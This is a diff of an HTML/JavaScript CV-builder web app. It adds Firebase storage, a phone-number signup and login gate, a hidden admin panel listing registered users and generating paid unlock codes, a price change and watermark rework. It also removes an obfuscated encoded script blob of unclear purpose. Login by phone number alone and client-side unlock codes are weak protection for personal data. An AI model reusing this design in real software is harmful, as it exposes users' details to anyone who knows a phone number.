@@ -14,6 +14,35 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 <!-- QR Code generator -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<!-- Firebase SDK -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+  import { getDatabase, ref, push, onValue, set, get } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+  // ── REPLACE with your Firebase project config ──
+  const firebaseConfig = {
+    apiKey: "REPLACE_apiKey",
+    authDomain: "REPLACE.firebaseapp.com",
+    databaseURL: "https://REPLACE-default-rtdb.firebaseio.com",
+    projectId: "REPLACE",
+    storageBucket: "REPLACE.appspot.com",
+    messagingSenderId: "000000",
+    appId: "REPLACE"
+  };
+  try {
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+    window._db = db;
+    window._ref = ref;
+    window._push = push;
+    window._onValue = onValue;
+    window._set = set;
+    window._get = get;
+    window._fbReady = true;
+  } catch(e) {
+    window._fbReady = false;
+    console.warn('Firebase not configured, using localStorage', e.message);
+  }
+</script>
 <style>
 *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
 :root{
@@ -380,6 +409,41 @@ input:checked+.slider::after{transform:translateX(22px);}
 .a-rule{background:#1E293B;border-radius:10px;padding:12px;font-size:11px;color:#64748B;line-height:1.7;}
 .a-rule b{color:#94A3B8;}
 
+
+/* ── SIGNUP MODAL ── */
+#signup-overlay{display:none;position:fixed;inset:0;z-index:20000;background:rgba(15,23,42,.95);backdrop-filter:blur(8px);align-items:center;justify-content:center;padding:20px;}
+#signup-overlay.show{display:flex;}
+#signup-box{background:#fff;border-radius:20px;width:100%;max-width:380px;overflow:hidden;box-shadow:0 32px 80px rgba(0,0,0,.4);}
+#signup-header{background:linear-gradient(135deg,#0F766E,#0D6B63);padding:28px 24px 22px;text-align:center;}
+#signup-header h2{color:#fff;font-size:20px;font-weight:900;margin-bottom:4px;}
+#signup-header p{color:rgba(255,255,255,.8);font-size:12px;}
+#signup-body{padding:22px 24px 28px;}
+.su-field{margin-bottom:14px;}
+.su-field label{display:block;font-size:11px;font-weight:700;color:#64748B;text-transform:uppercase;letter-spacing:.8px;margin-bottom:5px;}
+.su-field input{width:100%;padding:11px 14px;border:1.5px solid #E2E8F0;border-radius:9px;font-size:14px;color:#1E293B;outline:none;font-family:inherit;transition:border-color .15s;}
+.su-field input:focus{border-color:#0F766E;box-shadow:0 0 0 3px rgba(15,118,110,.1);}
+.su-btn{width:100%;padding:14px;background:linear-gradient(135deg,#0F766E,#0D6B63);color:#fff;border:none;border-radius:12px;font-weight:800;font-size:15px;cursor:pointer;margin-top:4px;}
+.su-btn:hover{opacity:.9;}
+.su-note{font-size:11px;color:#94A3B8;text-align:center;margin-top:10px;line-height:1.5;}
+.su-login-link{font-size:12px;color:#0F766E;text-align:center;margin-top:12px;cursor:pointer;font-weight:700;}
+#su-err{background:#FEF2F2;border:1px solid #FECACA;border-radius:8px;padding:8px 12px;font-size:12px;color:#991B1B;font-weight:600;margin-bottom:10px;display:none;}
+
+/* ── ENHANCED ADMIN PANEL ── */
+.admin-tabs{display:flex;border-bottom:1px solid #1E293B;margin-bottom:12px;}
+.admin-tab{flex:1;padding:8px;background:none;border:none;color:#475569;font-size:11px;font-weight:700;cursor:pointer;text-align:center;border-bottom:2px solid transparent;transition:all .15s;}
+.admin-tab.active{color:#60A5FA;border-bottom-color:#60A5FA;}
+.admin-tab-pane{display:none;}
+.admin-tab-pane.active{display:block;}
+.a-user-row{background:#1E293B;border-radius:8px;padding:10px 12px;margin-bottom:8px;font-size:11px;}
+.a-user-name{color:#E2E8F0;font-weight:700;font-size:12px;}
+.a-user-detail{color:#64748B;margin-top:2px;line-height:1.6;}
+.a-gen-btn{width:100%;padding:11px;background:#10B981;color:#fff;border:none;border-radius:8px;font-weight:800;font-size:13px;cursor:pointer;margin-top:8px;}
+.a-gen-btn:hover{background:#059669;}
+.a-code-out{background:#1E293B;border-radius:8px;padding:12px;text-align:center;margin-top:8px;}
+.a-code-big{font-size:28px;font-weight:900;color:#34D399;letter-spacing:8px;font-family:'Courier New',monospace;}
+.a-code-copy{margin-top:6px;padding:6px 16px;background:#3B82F6;color:#fff;border:none;border-radius:6px;font-size:11px;font-weight:700;cursor:pointer;}
+.a-no-users{color:#475569;font-size:12px;text-align:center;padding:20px 0;font-style:italic;}
+
 @media print{
   *{-webkit-print-color-adjust:exact!important;print-color-adjust:exact!important;color-adjust:exact!important;}
   html,body{margin:0!important;padding:0!important;background:white!important;}
@@ -424,7 +488,7 @@ input:checked+.slider::after{transform:translateX(22px);}
     <button class="tbtn tbtn-danger" onclick="confirmHardReset()" title="Hard reset all data">🗑 <span>Reset</span></button>
     <button class="tbtn tbtn-light" onclick="backupData()">💾 <span>Backup</span></button>
     <button class="tbtn tbtn-wm" onclick="downloadWatermarkPDF()" title="Download preview with One Net Solution watermark">🔒 <span>Preview PDF</span></button>
-    <button class="tbtn tbtn-dark" onclick="downloadPDF()"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>&nbsp;Download PDF&nbsp;<span style="background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.25);border-radius:20px;font-size:10px;font-weight:800;padding:2px 8px;letter-spacing:.2px;">&#x20B9;1</span></button>
+    <button class="tbtn tbtn-dark" onclick="downloadPDF()"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>&nbsp;Download PDF&nbsp;<span style="background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.25);border-radius:20px;font-size:10px;font-weight:800;padding:2px 8px;letter-spacing:.2px;">&#x20B9;5</span></button>
   </div>
 </div>
 
@@ -723,7 +787,7 @@ input:checked+.slider::after{transform:translateX(22px);}
     </div>
     <div style="display:flex;gap:8px;margin-top:10px;">
       <button onclick="downloadWatermarkPDF()" class="tbtn tbtn-wm" style="flex:1;justify-content:center;font-size:12px;">🔒 Preview PDF</button>
-      <button onclick="downloadPDF()" class="tbtn tbtn-dark" style="flex:1;justify-content:center;font-size:12px;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>&nbsp;Download PDF&nbsp;<span style="background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.22);border-radius:20px;font-size:9px;font-weight:800;padding:2px 7px;">&#x20B9;1</span></button>
+      <button onclick="downloadPDF()" class="tbtn tbtn-dark" style="flex:1;justify-content:center;font-size:12px;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>&nbsp;Download PDF&nbsp;<span style="background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.22);border-radius:20px;font-size:9px;font-weight:800;padding:2px 7px;">&#x20B9;5</span></button>
     </div>
   </div>
 </div>
@@ -736,7 +800,7 @@ input:checked+.slider::after{transform:translateX(22px);}
     <span>📄 CV Preview</span>
     <div style="display:flex;gap:6px;">
       <button class="export-btn" style="background:#7C3AED;" onclick="downloadWatermarkPDF()">🔒 Preview</button>
-      <button class="export-btn" onclick="downloadPDF()"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>&nbsp;Download PDF&nbsp;<span style="background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.2);border-radius:16px;font-size:9px;font-weight:800;padding:1px 7px;">&#x20B9;1</span></button>
+      <button class="export-btn" onclick="downloadPDF()"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>&nbsp;Download PDF&nbsp;<span style="background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.2);border-radius:16px;font-size:9px;font-weight:800;padding:1px 7px;">&#x20B9;5</span></button>
       <button class="close-btn" onclick="toggleMobilePreview()">✕ Close</button>
     </div>
   </div>
@@ -861,11 +925,11 @@ input:checked+.slider::after{transform:translateX(22px);}
         </svg>
       </div>
       <h2>Download Clean PDF</h2>
-      <p class="pay-sub">Pay &#x20B9;1 &rarr; Message us on WhatsApp &rarr; Get a code &rarr; Download</p>
+      <p class="pay-sub">Pay &#x20B9;5 &rarr; Message us on WhatsApp &rarr; Get a code &rarr; 1-Day Access</p>
       <div class="pay-price-tag">
         <span class="sym">&#x20B9;</span>
-        <span class="num">1</span>
-        <span class="lbl">per download</span>
+        <span class="num">5</span>
+        <span class="lbl">1-day access</span>
       </div>
     </div>
 
@@ -881,8 +945,8 @@ input:checked+.slider::after{transform:translateX(22px);}
                 <line x1="2" y1="10" x2="22" y2="10"/>
               </svg>
             </div>
-            <h3>Pay &#x20B9;1</h3>
-            <p>New here? Pay &amp; get your unlock code</p>
+            <h3>Pay &#x20B9;5</h3>
+            <p>New here? Pay &#x20B9;5 for full-day access</p>
           </div>
           <div class="pay-card" onclick="showCodeSec()" tabindex="0">
             <div class="pay-card-ico c-green">
@@ -912,7 +976,7 @@ input:checked+.slider::after{transform:translateX(22px);}
         </div>
         <div class="send-note">
           <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#166534" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
-          Send exactly <strong style="margin:0 3px;">&#x20B9;1</strong> — then press the button below
+          Send exactly <strong style="margin:0 3px;">&#x20B9;5</strong> — then press the button below
         </div>
         <button class="wa-btn" onclick="openWhatsApp()">
           <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
@@ -940,7 +1004,7 @@ input:checked+.slider::after{transform:translateX(22px);}
         <!-- How the code works (simple explanation) -->
         <div class="code-steps">
           <strong>How to get your code:</strong><br/>
-          1. Pay &#x20B9;1 to our UPI ID<br/>
+          1. Pay &#x20B9;5 to our UPI ID<br/>
           2. Send us the payment screenshot on WhatsApp<br/>
           3. We will send you a 6-letter code<br/>
           4. Type the code below and download your CV
@@ -980,7 +1044,7 @@ input:checked+.slider::after{transform:translateX(22px);}
 
         <div class="back-lnk" onclick="backToChooser()">
           &#8592; Go back &nbsp;&middot;&nbsp;
-          <span onclick="showUPISec()" style="color:#3B82F6;font-weight:700;cursor:pointer;">Pay &#x20B9;1</span>
+          <span onclick="showUPISec()" style="color:#3B82F6;font-weight:700;cursor:pointer;">Pay &#x20B9;5</span>
         </div>
       </div>
 
@@ -988,11 +1052,38 @@ input:checked+.slider::after{transform:translateX(22px);}
   </div>
 </div>
 
+
+<!-- SIGNUP / LOGIN GATE -->
+<div id="signup-overlay">
+  <div id="signup-box">
+    <div id="signup-header">
+      <h2>👤 Create Free Account</h2>
+      <p>Sign up free — pay only ₹5 when downloading your CV</p>
+    </div>
+    <div id="signup-body">
+      <div id="su-err"></div>
+      <div id="signup-form-view">
+        <div class="su-field"><label>Full Name *</label><input id="su-name" placeholder="Your full name" autocomplete="name"/></div>
+        <div class="su-field"><label>Phone Number *</label><input id="su-phone" type="tel" placeholder="e.g. 9876543210" autocomplete="tel"/></div>
+        <div class="su-field"><label>Email (optional)</label><input id="su-email" type="email" placeholder="your@email.com" autocomplete="email"/></div>
+        <button class="su-btn" onclick="doSignup()">🚀 Create Free Account</button>
+        <div class="su-note">Free to build. ₹5 only when you download clean PDF.</div>
+        <div class="su-login-link" onclick="showLoginView()">Already registered? Click here →</div>
+      </div>
+      <div id="login-form-view" style="display:none;">
+        <div class="su-field"><label>Phone Number *</label><input id="li-phone" type="tel" placeholder="Enter registered phone number" autocomplete="tel"/></div>
+        <button class="su-btn" onclick="doLogin()">✅ Continue to CV Builder</button>
+        <div class="su-login-link" style="margin-top:12px;" onclick="showSignupView()">New user? Sign up here →</div>
+      </div>
+    </div>
+  </div>
+</div>
+
 <!-- ADMIN PANEL — open by clicking logo 5 times fast -->
 <div id="admin-panel">
-  <div id="admin-box">
+  <div id="admin-box" style="max-width:380px;">
     <div id="admin-header">
-      <h3>Admin Panel</h3>
+      <h3>🔐 Admin Panel</h3>
       <button class="admin-x" onclick="closeAdmin()">&#x2715;</button>
     </div>
     <div id="admin-body">
@@ -1003,13 +1094,47 @@ input:checked+.slider::after{transform:translateX(22px);}
         <div class="a-err" id="a-err">Wrong password. Try again.</div>
       </div>
       <div id="admin-content">
-        <div class="a-lbl">Today's Date</div>
-        <div class="a-code" id="a-day">--</div>
-        <div class="a-date" id="a-date-full"></div>
-        <div class="a-rule">
-          <b>Today's valid codes must end in: <span id="a-eg-date" style="color:#34D399;font-size:16px;">--</span></b><br/><br/>
-          Example code you can give:<br/>
-          <b id="a-eg-code" style="color:#34D399;font-size:18px;letter-spacing:4px;">------</b>
+        <div class="admin-tabs">
+          <button class="admin-tab active" onclick="switchAdminTab('codes',this)">🔑 Codes</button>
+          <button class="admin-tab" onclick="switchAdminTab('users',this)">👥 Users</button>
+          <button class="admin-tab" onclick="switchAdminTab('generate',this)">⚡ Generate</button>
+        </div>
+
+        <!-- CODES TAB -->
+        <div class="admin-tab-pane active" id="atab-codes">
+          <div class="a-lbl">Today's Date</div>
+          <div class="a-code" id="a-day">--</div>
+          <div class="a-date" id="a-date-full"></div>
+          <div class="a-rule">
+            <b>Valid codes end in: <span id="a-eg-date" style="color:#34D399;font-size:16px;">--</span></b><br/>
+            Example code: <b id="a-eg-code" style="color:#34D399;font-size:18px;letter-spacing:4px;">------</b>
+          </div>
+        </div>
+
+        <!-- USERS TAB -->
+        <div class="admin-tab-pane" id="atab-users">
+          <div class="a-lbl" style="margin-bottom:8px;">Registered Users</div>
+          <div id="a-users-list"><div class="a-no-users">Loading users...</div></div>
+          <div style="margin-top:8px;padding:8px;background:#1E293B;border-radius:6px;font-size:10px;color:#475569;text-align:center;" id="a-user-count">–</div>
+        </div>
+
+        <!-- GENERATE TAB -->
+        <div class="admin-tab-pane" id="atab-generate">
+          <div class="a-lbl" style="margin-bottom:8px;">Auto-Generate Code</div>
+          <div class="a-rule" style="margin-bottom:10px;">
+            Give this code to users who have paid ₹5. Code is valid for <b style="color:#34D399;">today only</b>.
+          </div>
+          <button class="a-gen-btn" onclick="adminGenCode()">⚡ Generate New Code</button>
+          <div class="a-code-out" id="a-gen-out" style="display:none;">
+            <div style="font-size:10px;color:#64748B;margin-bottom:4px;">Share this code:</div>
+            <div class="a-code-big" id="a-gen-code-val">------</div>
+            <button class="a-code-copy" onclick="adminCopyCode()">📋 Copy Code</button>
+            <div style="font-size:10px;color:#475569;margin-top:6px;" id="a-gen-expiry"></div>
+          </div>
+          <div style="margin-top:12px;" class="a-rule">
+            <b style="color:#94A3B8;">Recent codes given:</b>
+            <div id="a-recent-codes" style="margin-top:6px;font-size:11px;color:#64748B;">–</div>
+          </div>
         </div>
       </div>
     </div>
@@ -1572,7 +1697,7 @@ function openLib(ji, field) {
   renderLibCats(); renderLibBullets();
   document.getElementById('lib-modal').classList.add('show');
 }
-function closeLib() { document.getElementById('lib-modal').classList.remove('show'); }
+function closeLib() { const el = document.getElementById('lib-modal'); if (el) el.classList.remove('show'); }
 function renderLibCats() {
   const c = document.getElementById('lib-cats');
   if (!c) return;
@@ -2163,9 +2288,6 @@ async function downloadWatermarkPDF() {
     });
     document.body.removeChild(iframe);
 
-    // ── Draw watermarks onto the captured canvas ──
-    _applyWatermark(cvCanvas, SCALE);
-
     // ── Slice into A4 pages with margins ──
     const { jsPDF } = window.jspdf;
     const pdf    = new jsPDF({ orientation:'portrait', unit:'mm', format:'a4', compress:true });
@@ -2176,15 +2298,34 @@ async function downloadWatermarkPDF() {
 
     const total = cvCanvas.height;
 
+    // Helper: check if a canvas slice has any real content (not all white)
+    function sliceHasContent(canvas, startY, lenY) {
+      const sampleStep = Math.max(1, Math.floor(lenY / 80));
+      const img = canvas.getContext('2d').getImageData(0, startY, canvas.width, Math.min(lenY, canvas.height - startY));
+      const px  = img.data;
+      for (let i = 0; i < px.length; i += 4 * sampleStep) {
+        if (px[i] < 245 || px[i+1] < 245 || px[i+2] < 245) return true;
+      }
+      return false;
+    }
+
     if (total / SCALE <= A4_H + 20) {
+      // Single page — one watermark centered
+      _applyWatermarkOnSlice(cvCanvas, 0, total, SCALE);
       const pc = _makePageCanvas(cvCanvas, A4_H * SCALE, 0, 0, total);
+      _applyWatermarkOnPageCanvas(pc, SCALE);
       pdf.addImage(pc.toDataURL('image/jpeg', 0.88), 'JPEG', 0, 0, 210, 297);
     } else {
       const slices = _smartSliceWM(cvCanvas, A4_H, P1_SAFE, P2_SAFE, A4_SCAN, SCALE);
-      slices.forEach((sl, si) => {
+      // Keep only content-holding pages (skip blank trailing pages)
+      const contentSlices = slices.filter(sl => sliceHasContent(cvCanvas, sl.start, sl.len));
+      contentSlices.forEach((sl, si) => {
+        // Draw exactly one watermark centered on this page slice
+        _applyWatermarkOnSlice(cvCanvas, sl.start, sl.len, SCALE);
         if (si > 0) pdf.addPage('a4', 'portrait');
         const topOff = si > 0 ? Math.round(MT2 * SCALE) : 0;
         const pc = _makePageCanvas(cvCanvas, A4_H * SCALE, sl.start, topOff, sl.len);
+        _applyWatermarkOnPageCanvas(pc, SCALE);
         pdf.addImage(pc.toDataURL('image/jpeg', 0.88), 'JPEG', 0, 0, 210, 297);
       });
     }
@@ -2204,57 +2345,44 @@ async function downloadWatermarkPDF() {
   }
 }
 
-// ── Draw "One Net Solution" watermark diagonally across entire canvas ──
-function _applyWatermark(canvas, scale) {
-  const ctx   = canvas.getContext('2d');
-  const W     = canvas.width;
-  const H     = canvas.height;
+// ── Draw ONE "One Net Solution" watermark centered on an already-sliced page canvas ──
+function _applyWatermarkOnPageCanvas(pageCanvas, scale) {
+  const ctx = pageCanvas.getContext('2d');
+  const W   = pageCanvas.width;
+  const H   = pageCanvas.height;
 
-  // ── Settings ──
-  const TEXT        = 'One Net Solution';
-  const FONT_SIZE   = Math.round(36 * scale);    // big enough to read clearly
-  const OPACITY     = 0.13;                       // subtle — visible but not obstructive
-  const ANGLE       = -35 * (Math.PI / 180);     // 35° diagonal
-  const COLOR       = '#1D4ED8';                  // professional blue
-  const REPEAT_GAP  = Math.round(180 * scale);   // gap between repeats
+  const TEXT      = 'One Net Solution';
+  const FONT_SIZE = Math.round(52 * scale);
+  const ANGLE     = -35 * (Math.PI / 180);
 
+  // Main diagonal watermark — centered on the page
   ctx.save();
-  ctx.globalAlpha   = OPACITY;
-  ctx.fillStyle     = COLOR;
-  ctx.font          = `700 ${FONT_SIZE}px "Helvetica Neue", Arial, sans-serif`;
-  ctx.textAlign     = 'center';
-  ctx.textBaseline  = 'middle';
-
-  // Tile the watermark across the full canvas in a diagonal grid
-  const diagLen = Math.sqrt(W * W + H * H);
-  const cols    = Math.ceil(diagLen / REPEAT_GAP) + 2;
-  const rows    = Math.ceil(diagLen / REPEAT_GAP) + 2;
-
-  // Rotate around canvas center
+  ctx.globalAlpha  = 0.18;
+  ctx.fillStyle    = '#1D4ED8';
+  ctx.font         = `700 ${FONT_SIZE}px "Helvetica Neue", Arial, sans-serif`;
+  ctx.textAlign    = 'center';
+  ctx.textBaseline = 'middle';
   ctx.translate(W / 2, H / 2);
   ctx.rotate(ANGLE);
-
-  for (let r = -rows; r <= rows; r++) {
-    for (let c = -cols; c <= cols; c++) {
-      const x = c * REPEAT_GAP;
-      const y = r * REPEAT_GAP;
-      ctx.fillText(TEXT, x, y);
-    }
-  }
-
+  ctx.fillText(TEXT, 0, 0);
   ctx.restore();
 
-  // ── Add a subtle bottom-right brand stamp ──
-  const STAMP_FONT = Math.round(10 * scale);
+  // Bottom-right stamp
+  const STAMP_FONT = Math.round(11 * scale);
   ctx.save();
-  ctx.globalAlpha  = 0.30;
+  ctx.globalAlpha  = 0.35;
   ctx.fillStyle    = '#1D4ED8';
   ctx.font         = `600 ${STAMP_FONT}px "Helvetica Neue", Arial, sans-serif`;
   ctx.textAlign    = 'right';
   ctx.textBaseline = 'bottom';
-  ctx.fillText('© One Net Solution — Preview Only', W - Math.round(8 * scale), H - Math.round(6 * scale));
+  ctx.fillText('© One Net Solution — Preview Only', W - Math.round(10 * scale), H - Math.round(8 * scale));
   ctx.restore();
 }
+
+// kept for backward compat (no-op)
+function _applyWatermark(canvas, scale) {}
+// kept for backward compat (no-op)
+function _applyWatermarkOnSlice(canvas, sliceStart, sliceLen, scale) {}
 
 // ── Copy a slice of srcCanvas into a clean A4-sized canvas with optional top offset ──
 function _makePageCanvas(src, a4Px, srcStart, topOff, srcLen) {
@@ -3081,8 +3209,7 @@ function buildDeclaration(data, shClass, name, col) {
 
 // ══════════════════════════════════════════════════════════
 // ═══════════════════════════════════════════════════════════
-(function(){var _k='CVBuilderProONS2026ProtectSecretKey99XYZ',_e='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